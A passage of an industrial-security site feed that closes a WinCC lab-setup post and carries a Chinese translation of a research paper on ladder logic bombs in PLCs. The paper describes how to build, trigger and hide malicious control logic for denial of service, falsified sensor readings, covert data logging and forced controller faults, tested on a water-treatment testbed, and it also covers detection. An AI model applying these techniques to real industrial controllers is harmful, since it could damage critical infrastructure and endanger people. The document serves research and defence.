+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/1.gif" /&gt;&lt;/p&gt;
+&lt;h4&gt;4.1 s7协议，建立与s7-300的PLC通讯。&lt;/h4&gt;
+&lt;p&gt;（1）通过step7将wincc和PLC集成到一起（本文为了方便，用户也可也采用分立的方式）。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/2.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/3.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/4.png" /&gt;&lt;/p&gt;
+&lt;p&gt;（2）将WinCC集成到Step7后编译，即为下图，需要的点自动导入到了WinCC中。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/5.png" /&gt;&lt;/p&gt;
+&lt;h4&gt;4.2 OPC协议，建立1769 PLC 、qunantum PLC和WinCC直接的通讯。&lt;/h4&gt;
+&lt;p&gt;（1）qunantum PLC的数据点。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/6.png" /&gt;&lt;/p&gt;
+&lt;p&gt;（2）A-B PLC数据点。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/7.png" /&gt;&lt;/p&gt;
+&lt;p&gt;（3）IGS 建立PLC的数据点&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/8.png" /&gt;&lt;/p&gt;
+&lt;h4&gt;4.3 WinCC建立数据点&lt;/h4&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/9.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/10.png" /&gt;&lt;/p&gt;
+&lt;h4&gt;4.4 WinCC建立画面和连点&lt;/h4&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/11.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;五、    运行画面&lt;/h2&gt;
+&lt;p&gt;最终运行的界面如下图所示，实现了三种协议在一个实验环境中运行。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wincc/12.jpg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">feilt</dc:creator><pubDate>Wed, 31 May 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-05-31:security/wincc_env.html</guid><category>工控技术</category></item><item><title>工业控制系统中的梯形逻辑炸弹</title><link>http://icsmaster.com/news/logicblob.html</link><description>&lt;div class="highlight"&gt;&lt;pre&gt;本文由工匠实验室翻译，非官方中文译文，原文《On Ladder Logic Bombs in Industrial Control Systems》
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;摘要&lt;/h2&gt;
+&lt;p&gt;在工业控制系统中，可编程逻辑控制器（PLC）通常被用于与传感器和执行器之间直接交互，并用于自动控制。 PLC的软件运行在两个不同的层上，固件层（即OS）和控制逻辑层（通过处理传感器数值，以确定控制行为）。
+我们所讨论梯形逻辑炸弹（LLB）是指用梯形图（或其他IEC 61131-3兼容语言）编写的恶意软件。这样的恶意软件将被攻击者注入到PLC上的现有控制逻辑中，改变控制动作或者等待特定的触发信号来激活恶意行为。攻击者可以用LLB篡改合法的传感器读数。我们通过Stuxnet（震网）病毒来具体说明LLB的概念，然后我们将展示几个基于真实PLC设备的设计的LLB。值得注意的是，LLB有一定的隐蔽性，也就是说操作员们难以通过人工检查的方式的检测到LLB。
+除了介绍逻辑层上的漏洞，我们还讨论了相应的对策。对此，我们提出了两种检测技术。&lt;/p&gt;
+&lt;h2&gt;关键词&lt;/h2&gt;
+&lt;p&gt;ICS;  逻辑炸弹&lt;/p&gt;
+&lt;h2&gt;1、引言&lt;/h2&gt;
+&lt;p&gt;工业控制系统（ICS）是通常控制与电力，水，气，制造和其他关键基础设施相关的运行状态的计算机系统。 ICS和监控和数据采集（SCADA）系统依靠本地可编程逻辑控制器（PLC）与传感器和执行器进行连接。虽然PLC设备由不同的厂商生产制造，但它们都通常使用与IEC 61131-3相同的编程语言编程。特别是，IEC 61131-3标准包含梯形逻辑图，功能块图和连续文本，作为不同的语言，它们一起用于编写在PLC上运行的逻辑程序，然后逻辑由PLC上运行的固件解释运行。现代PLC提供安全机制来保证上传合法固件。PLC上运行的逻辑通常可以由有网络连接或者有本地USB访问PLC权限的任何人进行更改。这种设计是与传统IT企业环境中恶意软件环境的主要区别，攻击者代码的注入通常会比传统的代码注入更加困难。
+最近，信息物理系统（CPS）以及其相关系统的安全性备受关注。特别是，诸如关键基础设施（包括电网，核电站和化工厂）等CPS都受到威胁。在CPS中，除传统的基于网络的攻击之外，组件之间的物理层交互也必须被视为潜在的攻击媒介。
+梯形逻辑炸弹（LLB），就是用梯形逻辑图编写的恶意软件。LLB由逻辑程序组成，旨在通过更改控制器行为或者由特定触发信号激活后，再激活恶意行为来中断PLC的正常操作。LLB甚至可以处于休眠状态并隐藏很长时间，直到捕获到特定的触发动作才被触发。一旦被激活，LLB就可以被攻击者用来篡改合法的传感器读数，然后由PLC将错误的值传给SCADA系统。我们根据编写LLB的目的和作用对其进行分类，并在实验室中展示了基于实际PLC设备的几种结构。
+我们在真实环境中实施和测试了ICS的攻击（SWaT testbed，参见第4节）。对于隐蔽性很强的LLB，即由操作人员难以通过手动检测PLC中运行的程序来检测到的LLB。我们将其归为基于逻辑的攻击的分类，例如由Stuxnet（震网）病毒执行的攻击。归纳我们的成果如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;我们分析目标平台上的固件以检测漏洞。&lt;/li&gt;
+&lt;li&gt;我们确定PLC的逻辑操作问题，并介绍梯形逻辑炸弹（LLB）的概念。&lt;/li&gt;
+&lt;li&gt;我们提供一系列LLB原型，特别是隐蔽性很强的LLB原型。&lt;/li&gt;
+&lt;li&gt;我们讨论基于手动和自动代码检测的对策，以及基于中央服务器的解决方案。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这篇文章的结构如下：第2部分介绍CPS系统，PLC和IEC 61131-3。第3节提出了我们的梯形逻辑炸弹（LLB）的概念，第4节中的我们用示例实现。第5节对LLB检测难度进行了一次小规模的评估。在第6节中我们提出了对LLB攻击的对策。第7节总结了该文章。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/logicbombs/1.png" /&gt;
+图1： 工厂控制系统的本地网络拓扑示例&lt;/p&gt;
+&lt;h2&gt;2、背景技术&lt;/h2&gt;
+&lt;p&gt;在本节中，我们将介绍我们迄今为止发现的工业控制系统（ICS）网络的一些突出特性。此外，我们将简要介绍梯形图逻辑编程语言以及与这些PLC交互所需的工具。&lt;/p&gt;
+&lt;h3&gt;2.1、ICS&lt;/h3&gt;
+&lt;p&gt;在这项工作的背景下，我们考虑用于监测和控制系统的ICS，如公共基础设施（水，电力），生产线或公共交通系统。特别地，我们假设该系统由可编程逻辑控制器，传感器，执行器和监控组件（如人机界面和服务器）组成。我们专注于具有本地连接的单站点系统，长距离连接还需要远程终端单元（见下文）等组件。所有这些组件通过公共网络拓扑连接。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;可编程逻辑控制器
+PLC通过分析传感器读数直接控制系统的部件，并遵循其控制逻辑，为连接的执行器产生命令。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;传感器和执行器
+这些组件与物理层交互，并直接连接到以太网（或间接通过远程输入/输出单元（IO）或PLC）连接。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络设备
+ICS经常使用网关设备在不同的工业协议（例如Modbus / TCP和Modbus / RTU）或通信介质之间进行转换。在这些网关连接到WAN的情况下，通常称为远程终端单元（RTU）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;2.2、梯形逻辑图&lt;/h3&gt;
+&lt;p&gt;可编程逻辑控制器（PLC）是一种工业计算机系统，可连续监视输入设备的状态，并根据自定义程序进行决策，以控制输出设备的状态。 PLC广泛应用在工业控制系统（ICS）中，用于处理传感器和执行器，主要是因为其强大的性能和耐受恶劣条件的能力，包括严重的热，冷，灰尘和极度的潮湿。考虑到它们广泛的图2：示例梯形图逻辑代码具有三个梯级使用和PLC处理的任务的重要性质，它们对恶意操纵的安全性至关重要.PLC是用户可编程的设备。 PLC程序通常写在本地主机（个人计算机）上的特殊应用程序中，然后通过直接连接电缆或通过网络下载到PLC。该程序存储在PLC中的非易失性闪存中。虽然与替代供应商的平台的细节不同，但可能需要通过物理开关（即ControlLogix设备上的程序模式）远程更改PLC上的控制软件。我们观察到，为了方便起见，在实际系统中，PLC通常保留在该设置中，以便于远程访问。此外，具有物理访问权限的任何攻击者都可以轻松更改开关设置。因此，我们假设在本工作的其余部分可以进行远程或本地重新编程访问。 IEC 61131-3是为PLC定义了2个图形和1个文本编程语言标准的开放国际标准[10]：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;梯形逻辑图（图形）&lt;/li&gt;
+&lt;li&gt;功能框图（图形）&lt;/li&gt;
+&lt;li&gt;结构化文本（文本）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这些语言中最流行的是梯形逻辑图。梯形图逻辑图背后的主要是提供类似系统接线图来抽象机电继电器的。梯形逻辑更多是由梯级实现的基于规则的图形语言，而不是传统的基于过程的语言。梯形图里的梯子代表了一个规则。它们被称为“梯形图”，因为它们类似于梯形，具有两个垂直导轨（电源）以及与表示的控制电路一样多的“梯级”（水平线）。图2描绘了在梯形图逻辑图，它包含三个梯级，它们利用各种输入，输出和指令块来实现某些逻辑。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/logicbombs/2.png" /&gt;
+图2 具有三个梯级的梯形图逻辑代码示例&lt;/p&gt;
+&lt;h3&gt;2.3、PLC漏洞分析&lt;/h3&gt;
+&lt;p&gt;作为我们研究工作的一部分，我们探索在PLC上运行的固件（如ControlLogix 5571）的漏洞。我们在此简要总结我们的成果。
+我们调查了具有物理访问PLC（或通过网络远程访问）的本地攻击者是否能够从PLC获取当前运行的固件，以及下装修改后版本的固件。为了更明显的观察到现象，后一种攻击在固件中安装隐藏的后门或木马，并更改固件的其他操作行为。我们发现通过使用本地USB连接，能够获得正在运行的固件。另外，如果将PLC硬件开关将设置为编程模式，则可以通过网络获取PLC固件。在下面的篇幅中，我们将讨论第二种攻击，也就是上传修改后固件。
+我们的PLC设备的固件信息为.dmk文件。该文件包含两组二进制文件（.bin）和相关的数字证书（.der）。它还包含.nvs文件，其中包含有关固件版本，产品代码和类型等的信息，该文件用作所有其他文件的头文件，将每个二进制映像与其相应的证书相链接，并加载每个文件的地址。
+数字证书由制造商（罗克韦尔自动化）签署。该数字签名是证书本身的哈希值，使用制造商的私钥通过RSA算法进行加密。此外，证书还在其数据字段之一中包含固件映像的加密散列（使用SHA-1）。在固件更新时间，模块（PLC）接收包含固件哈希值的证书和证书的数字签名。该模块计算证书的哈希值，解密签名，并比较哈希值。如果这些哈希值匹配，则证书是有效的。如果没有，则更新被拒绝。在收到整个固件映像后，该模块计算固件的哈希值，并将其与证书中的值进行比较。如果值不匹配，固件升级更新将被拒绝。在这种结构下，攻击者对固件映像的任何修改将改变散列和，导致证书中已经存在的哈希值之间的错误匹配。证书中的哈希值的任何更改将使制造商的签名无效。该过程在图3中更详细地解释&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/logicbombs/3.png" /&gt;
+图3 固件签名以及验证过程&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/logicbombs/4.png" /&gt;
+图4 闪烁的故障固件（修改后的证书）&lt;/p&gt;
+&lt;p&gt;鉴于所描述的设置，我们决定检查证书是否被PLC正确验证。我们删除了有效固件的原始证书，并将其替换为由我们自己（自行签名）CA签名的证书。我们确保伪造的证书在每个自定义数据字段中都具有匹配的内容，以匹配有效的固件映像及其散列值。然后，我们使用生成的文件（我们自己的.der）来更新PLC上的固件。更新失败，我们收到一个错误（传输：错误＃11001）。该过程可以在图4中找到，可以看出，尝试上传自定义证书时会触发错误。&lt;/p&gt;
+&lt;p&gt;结论：我们目前固件更新机制足以抵御攻击者的操纵。接下来，我们将会评估了PLC逻辑代码更新的过程。在这里，我们发现没有任何验证，来确保下装到PLC的逻辑更新来自授权的设备。在下文中，我们将目光专注于PLC逻辑的这种操作。&lt;/p&gt;
+&lt;h2&gt;3、梯形逻辑炸弹&lt;/h2&gt;
+&lt;p&gt;在本节中，我们介绍我们所提出的梯形逻辑炸弹的概念。特别地，我们注意到，虽然通过数字签名使PLC的固件更改变得异常困难，但是在PLC上执行的实际逻辑却不受这种措施的保护，而在将新的逻辑下载到PLC之前缺少安全检查和认证是造成这种局面的主要原因。攻击者可以利用这一点，通过网络访问PLC，并且可以将自定义（恶意）的逻辑程序下载到可能危及系统的PLC上。接下来，我们讨论可能利用此漏洞，实现攻击的方案和目标。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/logicbombs/5.gif" /&gt; 
+图5 梯形逻辑炸弹的分类&lt;/p&gt;
+&lt;h3&gt;3.1、系统和攻击者模型&lt;/h3&gt;
+&lt;p&gt;在这项工作中，我们假设攻击者能够通过网络远程访问工业控制系统中的PLC，或者物理地访问PLC。如我们所示，通常这种访问将允许攻击者在没有任何身份验证的情况下读取和修改PLC的编程逻辑。假设攻击者可以通过下载和上传逻辑配置到PLC的相应软件。&lt;/p&gt;
+&lt;p&gt;攻击者的目标可以从实现拒绝服务（DoS）到改变PLC的行为，或获取由PLC跟踪处理的传感器和控制消息的数据。为了执行这些攻击，攻击者只需要通过PLC系统的一次验证，这使得这种攻击更加危险。攻击者也可以对PLC进行零星（物理）访问。例如，攻击者每周只访问一次PLC。 在这些事件中，攻击者可以在与他的访问时间无关的点触发任何行为（即触发他的梯形逻辑炸弹代码）。&lt;/p&gt;
+&lt;p&gt;我们所考虑的情景是非常通用的，工业控制系统中的PLC，一般使用IEC 61131-3语言编程，并且可以重新编程。它与关键的传感器和执行器连接。工厂的操作员在设计时配置了PLC的逻辑。尽管他们不断监控这些PLC的状态，但很少需要改变已经运行的系统的逻辑配置。如果需要的话，他们也可以手动下载逻辑来检查它。虽然我们稍后将简要讨论使用入侵检测系统的基于网络的检测机制，但这样的解决方案将无法检测到本地攻击者的变化。因此，在这项工作中，我们不重点关注IDS。此外，物理层预防机制（摄像机，围栏等）不在监视的范围之内。&lt;/p&gt;
+&lt;p&gt;我们不认为攻击者能够攻击操作员站（如在Stuxnet中的情况），或者能够在数据传输时操纵网络流量。值得注意的是，如果攻击者能够破坏操作员站，那么操作员将无法可靠地验证任何代码。这样的攻击者可以通过使用可信的计算平台来寻址定位，而这并不是我们考虑的问题。攻击者模型也不会考虑内部攻击（例如，可能是正式工程师/操作员等有权访问和修改PLC逻辑的攻击者）。&lt;/p&gt;
+&lt;h3&gt;3.2、逻辑炸弹分类&lt;/h3&gt;
+&lt;p&gt;梯形逻辑炸弹可以广泛地分为两类（如图5所示）。 LLB可以根据其激活和触发进行分类。 他们可以通过给其一定的输入而被触发。或者，它们也可以由内部逻辑（系统状态，特定指令或数据，时钟等）触发。&lt;/p&gt;
+&lt;p&gt;LLB也可以根据它们对现有PLC系统的改变进行分类。他们可以添加或删除现有逻辑（修改功能）中的某些功能。这些逻辑炸弹也可以改变系统值，如系统日期/时间，时区，挂钟时间或类似（修改系统）。最后，这些也可以用于数据泄露，并将关键系统数据传输到间谍节点（传输信息）。另外，这些分类现在用来描述更具体的LLB。例如，在12  AM关闭泵的LLB将被分类为内部激活的功能修改LLB。&lt;/p&gt;
+&lt;h3&gt;3.3、攻击载荷类型&lt;/h3&gt;
+&lt;p&gt;在下文中，我们提供了一系列攻击载荷类型，可用于实现第3.1节所述的攻击者目标。攻击载荷可以是公开的破坏性的（例如，使用拒绝服务（DoS）），或者使隐身攻击（例如通过建立中间人的方式）来实现.MitM 攻击载荷可以用来监听通过的流量节点，或潜在地操纵这些消息的内容未被检测到。 通过操纵消息内容，攻击者可以伪造报告给其他PLC和SCADA系统的传感器读数，或更改发送到执行器的命令。下面我们详细介绍这些攻击目标。&lt;/p&gt;
+&lt;h4&gt;3.3.1梯形逻辑炸弹的Dos攻击&lt;/h4&gt;
+&lt;p&gt;非常基础（但具有破坏性）攻击载荷对PLC执行拒绝服务（DoS）攻击。 通过添加隐藏在特定PLC的梯形图逻辑中的恶意逻辑，可以将PLC失去控制并使其停止。这可能会损害由PLC控制的过程，并可能导致系统中的性能威胁状态。这样的炸弹将不断等待触发条件，一旦满足，它就可以启动死循环，重复的调用子程序等，并使PLC失效。&lt;/p&gt;
+&lt;h4&gt;3.3.2、梯形逻辑炸弹操纵传感器读数和命令&lt;/h4&gt;
+&lt;p&gt;另一类梯形逻辑炸弹可用于篡改在PLC中使用或者生成的实际数据。这种攻击的最简单的目标是从远程IO（图1中的RIO）读取传感器值。可以操纵这些值以使系统进入本不应该进入的状态。（图6）&lt;/p&gt;
+&lt;h4&gt;3.3.3、用于隐蔽记录敏感数据的逻辑炸弹&lt;/h4&gt;
+&lt;p&gt;可以使用第三类LLB来秘密跟踪并保存敏感PLC数据的日志。这可以通过使用FIFO缓冲区并将数据记录到PLC上的数组中来实现。这些炸弹是特别危险的，因为这些炸弹不会扰乱系统的工作，使得主机完全不了解它们的存在。这些可以在逻辑上保持延长的时间，无需检测，不断泄漏敏感数据和命令。&lt;/p&gt;
+&lt;h3&gt;3.4 触发&lt;/h3&gt;
+&lt;p&gt;在这里，我们描述可用于梯形逻辑炸弹的不同触发机制。
+&lt;img alt="ALT" src="/static/images/logicbombs/6.png" /&gt;
+图6：操作从RIO到HMI的传感器读数以及从HMI到RIO的控制指令&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;触发特定的输入
+当检测到预先确定的输入时，该炸弹可能被关闭。例如，我们正在针对我们实验的水处理ICS（见第4.1节）。目标PLC从其相应的液位传感器接收关于其中一个油箱中的水位的输入。当油箱达到一个特定的水平时，这个炸弹可能被关闭。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;触发序列
+当检测到特定的触发序列时，就可以触发该炸弹。这可以使得该炸弹更难以检测，因为在将特定序列作为输入检测到之前，其影响将不可见。这可以通过使用基于锁存器的有限状态机（FSM）来实现。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;计时器
+炸弹也可以使用计时器关闭。这将使LLB像一个真实世界的定时炸弹，当定时器完成其计数序列时，它将进入运动状态。使用嵌套TON计时器，可以实现将持续数天的计数序列。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;具体内部条件
+当实现特定的内部状态时，可以触发该炸弹。这种特殊的触发方案要求攻击者对PLC的逻辑有完整的了解和理解。当设置特定状态变量（例如故障代码）时，可以将炸弹设置为关闭并且执行攻击载荷逻辑。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;3.5 在PLC逻辑中隐藏梯形逻辑炸弹&lt;/h3&gt;
+&lt;p&gt;检测原始逻辑（在我们的例子中是LLB）中的任何修改的原理将是从PLC设备下载控制逻辑，并手动检查它们以进行代码更改。特别地，熟悉工厂操作的工程师可以通过阅读代码并检测到恶意更改。这种方法对于小型站点和非常简单的逻辑可能是可行的，但我们将在下文中展示，攻击者可以通过几种方式来隐藏逻辑中的恶意有效负载，从而使得此类手动检查更难以检测。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/logicbombs/7.png" /&gt;
+图7：SWaT Testbed的概述&lt;/p&gt;
+&lt;h2&gt;4. 现场实施攻击&lt;/h2&gt;
+&lt;p&gt;在本节中，我们详细描述了梯形逻辑炸弹的构造，并展示了如何利用它们来扰乱ICS的功能。&lt;/p&gt;
+&lt;h3&gt;4.1 SWaT Testbed&lt;/h3&gt;
+&lt;p&gt;实验在位于新加坡技术与设计大学的工业控制系统测试台（称为SWaT）进行。 如图7所示，安全水处理是一个功能齐全（按比例缩小）的水处理设备。 SWaT专门作为网络物理系统安全研究的平台。水处理过程分为六个阶段，从水槽1中的原水开始到水槽 6中过滤的输出水。每个阶段由独立的PLC控制，传感器的数据用于确定控制动作。
+传感器值和执行器命令通过工厂网络与PLC通信。该系统还包含监视器以查看并确保系统状态处于可接受的操作边界内。来自传感器的数据可用于监控和数据采集（SCADA）工作站的检查，并由历史站记录以供后续分析。&lt;/p&gt;
+&lt;h3&gt;4.2 攻击1： DoS攻击&lt;/h3&gt;
+&lt;p&gt;拒绝服务攻击（DoS）是对关键系统造成（最常见的财务或声誉）损害的常用攻击手段。在DoS攻击中，攻击者暂时或永久地减慢或停止系统的正常运行。在互联网上，分布式DoS攻击通常会通过创建大量的流量来实现，这些流量会使通信链路或服务器超负荷。由于PLC控制系统中传感器和执行器的动作，因此其运行可靠性通常至关重要。如果PLC无法控制执行器，则可能会产生灾难性的后果（例如，导致汽车组装厂中重型机械的失控）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;目标
+在这种情况下，目标是在水处理厂的一台PLC上发起DoS攻击。 &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实施
+这是通过实施死循环作为逻辑炸弹来实现的。该梯形逻辑炸弹的触发机制是在接收到特定输入时。类似于Stuxnet，触发检查条件位于实际的逻辑之上，它始终保持在检查是否已接收到特定输入。一旦接收到所需的触发输入，LLB就会起作用。
+&lt;img alt="ALT" src="/static/images/logicbombs/8.png" /&gt;
+图8：恶意附加指令&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;隐藏
+实际上，恶意逻辑会隐藏在附加指令中。例如：创建了一个其结构与实际ADD块非常相似新的块，具有相类似的输入：2个输入A和B，以及一个输出：目标输出。它也被命名为（ADD _A）与真正的ADD块伪装。从梯形图逻辑（包含多个梯级）的顶部概述，这看起来与任何一个梯级上的其他ADD块无异。但是在这个附加块中，定义了逻辑炸弹（死循环），并对PLC操作产生不利影响。有关这方面的更多细节可以在图8中看到。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;4.3 攻击2：篡改传感器数据&lt;/h3&gt;
+&lt;p&gt;ICS中的另一个重要功能（除了控制执行器）是实时地从传感器读取数据。该数据可能是有关流程和系统的关键信息。根据这些数据，可以导出流程的当前状态，由PLC使用该状态来确定适当的控制动作。因此，篡改传感器数据可能会导致系统错误。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;目标
+此次攻击的目标是操纵从远程IO（图1中的RIO）到PLC传感器读数。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;结构
+由于这只是概念验证，我们决定操纵传感器值，让传感器值以固定的步长自增（我们任意选择了四个值）。因此，该LLB 攻击载荷是一个简单的ADD块，它获取真实的传感器值，并将其数值每次自增4，并将它们存储回原位置。然而，在这次攻击中使用了更复杂的触发机制。特别是，当检测到完整的触发序列时触发LLB。这通过使用基于锁存器的有限状态机来实现（见图9）
+&lt;img alt="ALT" src="/static/images/logicbombs/9.png" /&gt;
+图9：利用子程序内部
+&lt;img alt="ALT" src="/static/images/logicbombs/10.png" /&gt;
+图10：利用子程序的逻辑概述&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;隐藏
+对于这次攻击，我们还使用了一种不同的隐藏技术。通过检查水处理厂中PLC的实际逻辑，我们观察到逻辑正在调用大量子程序。事实上，程序的编写者会通过调用子程序这种方式，来保证梯形逻辑图的良好的可读性。然而，具有大量子程序调用的结构可以被攻击者利用来隐藏LLB。我们通过隐藏在梯形逻辑图的子程序来测试这个漏洞，这些子程序在每个周期都会被执行（见图10）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;4.4 攻击3：使用FFL进行数据窃取&lt;/h3&gt;
+&lt;p&gt;上述的攻击方式可以明显地造成损害或故障，一旦触发即可观察到其影响。然而，还有另一类LLB可能同样有害，但难以检测。特别是，这样的LLB可以用于数据记录和导出关于系统的敏感信息。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;目标
+这次攻击的目标是实现对工厂敏感信息的数据记录并不被察觉。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实施
+通过使用将数据读入数组的FIFO缓冲器来实现数据记录。FFL块已被用于此攻击。如图11所示，FFL块存储包含关于用于确定工厂状态的计数序列的敏感信息的标签——PB LT Seq。这些值存储在array2中，并被转换成.csv格式并存储在PLC的SD卡上。在我们的攻击者模型中，有可以进入工厂的，具有零星访问（物理访问PLC）特征的攻击者，他们通过读取SD卡获取这些数据。然后，将此卡插回PLC并离开。触发方式可以是一个简单的定时器，从而实现对工厂“x”天之后的数据记录。
+&lt;img alt="ALT" src="/static/images/logicbombs/11.png" /&gt;
+图11：FIFO缓冲区中的数据记录&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;隐藏
+该LLB可以再次隐藏在附加指令或子程序中。它也可以留在主逻辑流程中，因为这个LLB只包含一个额外的梯级，使其在大而复杂的代码中难以进行手动检测。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;4.5 攻击4：触发PLC异常&lt;/h3&gt;
+&lt;p&gt;我们现在讨论与DoS攻击相似的另一个攻击。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;目标
+目标是触发PLC的主要故障，导致其处理器停止，且不能通过硬复位来修复。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实施
+这里我们设法在PLC上造成两个主要故障。
+&lt;strong&gt;1、无效的数组下标&lt;/strong&gt;
+这是通过对标签收集数组越界访问实现的。这可以通过创建FIFO缓冲区长度和用于存储缓冲区值的数组的大小之间的不匹配来实现。细节见图12。
+&lt;img alt="ALT" src="/static/images/logicbombs/12.png" /&gt;
+图12：无效的数组下标
+&lt;strong&gt;2、堆栈溢出&lt;/strong&gt;
+这是通过实现对其自身的递归子程序调用来实现的。这导致堆栈存储的返回指针溢出，进程停止并使PLC崩溃（图13）。
+&lt;img alt="ALT" src="/static/images/logicbombs/13.png" /&gt;
+图13：堆栈溢出&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;隐藏
+这些LLB可以隐藏在Add On指令或子程序内&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;4.6 攻击分析&lt;/h3&gt;
+&lt;p&gt;理想情况下，将会有一个衡量LLB隐蔽性的指标，这表明查验出LLB的难度有多大。到目前为止，我们还没有找到一种衡量性能的好办法。在下文中，我们使用相对的附加代码行（RALOC）来测量隐蔽性。此外，逻辑中代码行的增加也可能会导致运行时内存消耗增加。我们观察到梯形图逻辑程序使用两种类型的存储器：I / O存储器和数据和逻辑存储器。作为我们分析的一部分，我们测量了添加恶意梯形逻辑炸弹时与原始逻辑的内存占用率差异（增加）。据观察，PLC的I / O存储器根本没有增加，这主要是因为没有新的输入/输出来触发或应用上面讨论的梯形逻辑炸弹。观察到的唯一增长是在数据和逻辑存储器中，这也是边缘的，如表1所示。值得注意的是，Attack 3的大小（数据记录）将取决于记录的数据量。因此，RALOC度量会增加，修改带来的影响也会更加显著。为了减轻这种影响，最好将数据保存在SD卡上，然后重置数组，以便在需要更多数据时可以重新使用。&lt;/p&gt;
+&lt;p&gt;表1：攻击时内存增加的比较
+&lt;img alt="ALT" src="/static/images/logicbombs/14.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;5. 检测难度评估&lt;/h2&gt;
+&lt;h3&gt;5.1 评估背景&lt;/h3&gt;
+&lt;p&gt;为了估计人们检测LLB的难度，我们组织举办了一场小规模的挑战赛，将其作为我们机构调查研究的一部分。来自学术界和行业内的六支队伍参加了此次活动，并参与了三个与LLB相关的挑战。我们了解到，并不是所有参与者都非常熟悉梯形逻辑编程，因此为每个团队都提供了一个测试手册，以便让其了解整体设置，软件使用和标签的初始化。分布于世界各地的团队通过远程连接参与这项挑战，与实验室中的虚拟操作员站和实际PLC连接。值得注意的是，虚拟机配置了Studio 5000和RSLinx，以向测试台PLC提供通信。参与者通过虚拟专用网络（VPN）连接到虚拟操作员站。对于所有的三个挑战，PLC都具有基本配置，与IO交互并发送选定的控制信号。现在总结一下挑战赛，其中涉及问题陈述的简要描述，以及具体的要实现的目标。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;夺旗挑战
+第一个挑战的目标是检测一个旨在读取传感器数值的LLB，它会获取传感器读数，然后将该读数转发到外部。为了完成这个挑战，参与者必须追踪从所有传感器到控制器的数据流，并且识别出不需要传感器数值的代码部分。在识别LLB代码之后，参与者可以读取所创建的标签值以代表夺旗成功。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;与ADD_ON捉迷藏
+第二个挑战是获取由某种逻辑读取到的模拟传感器读数的真实值。为了解决这个挑战，参与者必须检测一个试图隐藏为添加指令的LLB（见图8）。一旦参与者检测到LLB，他们就可以将其移除以获取真实值（或者简单地确定所使用的偏移量，并手动移除它）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;逻辑错误修复挑战
